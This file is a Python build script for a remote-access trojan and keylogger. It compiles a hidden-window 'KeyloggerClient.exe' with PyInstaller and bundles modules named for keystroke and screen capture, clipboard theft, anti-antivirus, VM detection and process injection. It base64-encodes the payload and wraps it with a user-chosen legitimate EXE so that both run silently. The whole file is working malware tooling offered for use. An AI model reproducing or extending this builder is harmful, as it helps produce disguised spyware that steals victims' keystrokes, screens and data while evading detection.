import os
import subprocess
import logging
import sys
import shutil
import base64
import tkinter as tk
from tkinter import filedialog, messagebox
from rat_config import Config

# Configure logging
if Config.DEBUG_MODE:
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(Config.ERROR_LOG_FILE),
            logging.StreamHandler()
        ]
    )
else:
    logging.getLogger().addHandler(logging.NullHandler())
    logging.getLogger().setLevel(logging.CRITICAL + 1)

class Builder:
    def __init__(self):
        self.source_file = "main.py"
        self.output_dir = "dist"
        self.payload_exe = os.path.join(self.output_dir, "KeyloggerClient.exe")
        self.b64_output = os.path.join(self.output_dir, "KeyloggerClient_b64.txt")
        self.bind_output = os.path.join(self.output_dir, "binded_output.exe")
        self.is_ci = os.getenv('CI') or os.getenv('GITHUB_ACTIONS')

    def install_requirements(self):
        """Install dependencies from requirements.txt if it exists."""
        requirements_file = "requirements.txt"
        try:
            if os.path.exists(requirements_file):
                print(f"Installing dependencies from {requirements_file}...")
                logging.info(f"Installing dependencies from {requirements_file}...")
                
                # Upgrade pip first
                subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True)
                
                # Install all requirements
                subprocess.run([sys.executable, "-m", "pip", "install", "-r", requirements_file], check=True)
                
                # Install additional dependencies that might be missing
                additional_deps = [
                    "cryptography",
                    "pynput",
                    "win32api",
                    "win32con",
                    "win32process",
                    "win32security",
                    "pywin32"
                ]
                
                for dep in additional_deps:
                    try:
                        subprocess.run([sys.executable, "-m", "pip", "install", dep], check=False)
                    except:
                        pass
                
                print("Dependencies installed successfully")
                logging.info("Dependencies installed successfully")
            else:
                print(f"{requirements_file} not found, skipping dependency installation")
                logging.warning(f"{requirements_file} not found, skipping dependency installation")
        except Exception as e:
            print(f"Failed to install dependencies: {str(e)}")
            logging.error(f"Failed to install dependencies: {str(e)}")
            raise Exception(f"Failed to install dependencies: {str(e)}")

    def build_payload(self):
        """Build the source code into an executable without obfuscation."""
        try:
            print("Building payload with PyInstaller...")
            logging.info("Building payload with PyInstaller...")

            # Check if source file exists
            if not os.path.exists(self.source_file):
                raise Exception(f"Source file not found: {self.source_file}")

            # Create output directory if it doesn't exist
            os.makedirs(self.output_dir, exist_ok=True)

            # Comprehensive PyInstaller command with all dependencies
            pyinstaller_cmd = [
                "pyinstaller",
                "--noconfirm",
                "--onefile",
                "--windowed" if self.is_ci else "--noconsole",  # Use --windowed in CI
                "--clean",
                
                # Hidden imports for keyboard/input monitoring
                "--hidden-import", "keyboard",
                "--hidden-import", "pynput",
                "--hidden-import", "pynput.keyboard",
                "--hidden-import", "pynput.mouse",
                
                # Hidden imports for GUI/screenshots
                "--hidden-import", "pyautogui",
                "--hidden-import", "PIL",
                "--hidden-import", "PIL.Image",
                "--hidden-import", "PIL.ImageGrab",
                
                # Hidden imports for system operations
                "--hidden-import", "psutil",
                "--hidden-import", "pyperclip",
                
                # Hidden imports for Windows API
                "--hidden-import", "win32api",
                "--hidden-import", "win32con",
                "--hidden-import", "win32process",
                "--hidden-import", "win32security",
                "--hidden-import", "win32file",
                "--hidden-import", "win32service",
                "--hidden-import", "win32serviceutil",
                "--hidden-import", "pywintypes",
                
                # Hidden imports for networking
                "--hidden-import", "requests",
                "--hidden-import", "urllib3",
                "--hidden-import", "certifi",
                
                # Hidden imports for encryption
                "--hidden-import", "cryptography",
                "--hidden-import", "cryptography.hazmat",
                "--hidden-import", "cryptography.hazmat.primitives",
                "--hidden-import", "cryptography.hazmat.primitives.ciphers",
                "--hidden-import", "cryptography.hazmat.backends",
                "--hidden-import", "cryptography.hazmat.backends.openssl",
                
                # Hidden imports for configuration
                "--hidden-import", "dotenv",
                "--hidden-import", "packaging",
                "--hidden-import", "packaging.version",
                
                # Hidden imports for custom modules
                "--hidden-import", "system.file_manager",
                "--hidden-import", "system.collector",
                "--hidden-import", "system.vm_detector",
                "--hidden-import", "system.anti_av",
                "--hidden-import", "system.process_injector",
                "--hidden-import", "monitoring.logger",
                "--hidden-import", "monitoring.rdp_controller",
                "--hidden-import", "network.communicator",
                "--hidden-import", "encryption.manager",
                "--hidden-import", "commands.handler",
                
                # Collect all submodules
                "--collect-submodules", "cryptography",
                "--collect-submodules", "PIL",
                "--collect-submodules", "pynput",
                
                # Copy metadata
                "--copy-metadata", "cryptography",
                "--copy-metadata", "requests",
                
                # Output directories
                "--distpath", self.output_dir,
                "--specpath", "build",
                "--workpath", "build",
                
                # Add icon if exists
            ]
            
            # Add icon if available
            if os.path.exists("icon.ico"):
                pyinstaller_cmd.extend(["--icon", "icon.ico"])
            
            # Add the source file
            pyinstaller_cmd.append(self.source_file)
            
            print(f"Executing PyInstaller with {len(pyinstaller_cmd)} arguments...")
            logging.debug(f"PyInstaller command: {' '.join(pyinstaller_cmd)}")
            
            # Run PyInstaller
            result = subprocess.run(pyinstaller_cmd, check=True, capture_output=True, text=True)
            
            if result.stdout:
                print("PyInstaller stdout:", result.stdout[:500])
            if result.stderr:
                print("PyInstaller stderr:", result.stderr[:500])

            # Rename the output executable
            original_exe = os.path.join(self.output_dir, "main.exe")
            if os.path.exists(original_exe):
                if os.path.exists(self.payload_exe):
                    os.remove(self.payload_exe)
                shutil.move(original_exe, self.payload_exe)
                
                # Get file size
                file_size = os.path.getsize(self.payload_exe)
                file_size_mb = file_size / (1024 * 1024)
                
                print(f"Payload built successfully: {self.payload_exe}")
                print(f"File size: {file_size_mb:.2f} MB")
                logging.info(f"Payload built successfully: {self.payload_exe} ({file_size_mb:.2f} MB)")
            else:
                raise Exception("PyInstaller output not found")

        except subprocess.CalledProcessError as e:
            print(f"PyInstaller failed with exit code {e.returncode}")
            print(f"stdout: {e.stdout}")
            print(f"stderr: {e.stderr}")
            logging.error(f"Build error: {str(e)}")
            raise Exception(f"Failed to build payload: {str(e)}")
        except Exception as e:
            print(f"Build error: {str(e)}")
            logging.error(f"Build error: {str(e)}")
            raise Exception(f"Failed to build payload: {str(e)}")

    def encode_payload_to_base64(self):
        """Encode the built payload executable to Base64."""
        try:
            print(f"Encoding payload to Base64: {self.payload_exe}")
            logging.info(f"Encoding payload to Base64: {self.payload_exe}")

            # Check if payload executable exists
            if not os.path.exists(self.payload_exe):
                raise Exception(f"Payload executable not found: {self.payload_exe}")

            # Read the executable as binary and encode to Base64
            with open(self.payload_exe, 'rb') as f:
                binary_data = f.read()
                b64_encoded = base64.b64encode(binary_data).decode('utf-8')

            # Save the Base64-encoded string to a text file
            with open(self.b64_output, 'w', encoding='utf-8') as f:
                f.write(b64_encoded)
            
            print(f"Base64-encoded payload saved to: {self.b64_output}")
            logging.info(f"Base64-encoded payload saved to: {self.b64_output}")

        except Exception as e:
            print(f"Base64 encoding error: {str(e)}")
            logging.error(f"Base64 encoding error: {str(e)}")
            raise Exception(f"Failed to encode payload to Base64: {str(e)}")

    def bind_exe(self, target_exe):
        """Bind the payload with another EXE file."""
        try:
            print(f"Binding payload with {target_exe}...")
            logging.info(f"Binding payload with {target_exe}...")

            if not os.path.exists(self.payload_exe):
                raise Exception("Payload executable not found")

            if not os.path.exists(target_exe):
                raise Exception(f"Target EXE not found: {target_exe}")

            # Create a wrapper script to execute both EXEs
            wrapper_code = f"""
import subprocess
import os
import sys

def run_target_exe():
    try:
        subprocess.Popen(r"{target_exe}", shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        pass

def run_payload():
    try:
        subprocess.Popen(r"{self.payload_exe}", shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        pass

if __name__ == "__main__":
    run_target_exe()
    run_payload()
"""
            wrapper_script = "wrapper.py"
            with open(wrapper_script, "w", encoding="utf-8") as f:
                f.write(wrapper_code)

            # Build the wrapper script into an executable
            pyinstaller_cmd = [
                "pyinstaller",
                "--noconfirm",
                "--onefile",
                "--windowed",
                "--distpath", self.output_dir,
                "--specpath", "build",
                wrapper_script
            ]
            
            print("Building wrapper executable...")
            logging.debug(f"Executing PyInstaller command: {' '.join(pyinstaller_cmd)}")
            subprocess.run(pyinstaller_cmd, check=True)

            # Rename the wrapper output
            original_wrapper = os.path.join(self.output_dir, "wrapper.exe")
            if os.path.exists(original_wrapper):
                if os.path.exists(self.bind_output):
                    os.remove(self.bind_output)
                shutil.move(original_wrapper, self.bind_output)
                print(f"Binding completed: {self.bind_output}")
                logging.info(f"Binding completed: {self.bind_output}")
            else:
                raise Exception("Wrapper executable not found")

            # Clean up temporary wrapper script
            if os.path.exists(wrapper_script):
                os.remove(wrapper_script)

        except Exception as e:
            print(f"Binding error: {str(e)}")
            logging.error(f"Binding error: {str(e)}")
            raise Exception(f"Failed to bind EXE: {str(e)}")

    def run(self):
        """Run the build process with user interaction for local execution."""
        root = None
        try:
            print("=" * 50)
            print("Starting build process...")
            print("=" * 50)
            
            # Install dependencies
            self.install_requirements()

            # Build the payload
            self.build_payload()

            # Encode the payload to Base64
            self.encode_payload_to_base64()

            print("=" * 50)
            print("Build completed successfully!")
            print(f"Output: {self.payload_exe}")
            print(f"Base64: {self.b64_output}")
            print("=" * 50)

            # Check if running in a CI/CD environment
            if self.is_ci:
                print("Running in CI/CD environment, skipping binding.")
                logging.info("Running in CI/CD environment, skipping binding.")
                return

            # Ask user if they want to bind with another EXE (local execution only)
            root = tk.Tk()
            root.withdraw()  # Hide the main window
            if messagebox.askyesno("EXE Binding", "Do you want to bind the payload with another EXE file?"):
                file_path = filedialog.askopenfilename(
                    title="Select EXE File",
                    filetypes=[("Executable files", "*.exe")]
                )
                if file_path:
                    self.bind_exe(file_path)
                    messagebox.showinfo("Success", 
                        f"File successfully bound!\n\n"
                        f"Bound file: {self.bind_output}\n"
                        f"Original payload: {self.payload_exe}\n"
                        f"Base64 encoded: {self.b64_output}")
                else:
                    messagebox.showwarning("Warning", 
                        f"No file selected.\n\n"
                        f"Non-bound payload: {self.payload_exe}\n"
                        f"Base64 encoded: {self.b64_output}")
            else:
                messagebox.showinfo("Success", 
                    f"Payload built without binding!\n\n"
                    f"Payload: {self.payload_exe}\n"
                    f"Base64 encoded: {self.b64_output}")

        except Exception as e:
            error_msg = f"Build process failed: {str(e)}"
            print(error_msg)
            logging.error(error_msg)
            
            if not self.is_ci:
                try:
                    messagebox.showerror("Error", error_msg)
                except:
                    pass
            
            raise Exception(error_msg)
        finally:
            if root:
                try:
                    root.destroy()
                except:
                    pass

if __name__ == "__main__":
    if Config.TEST_MODE:
        print("Test mode enabled: Skipping actual build process.")
    else:
        builder = Builder()
        builder.run()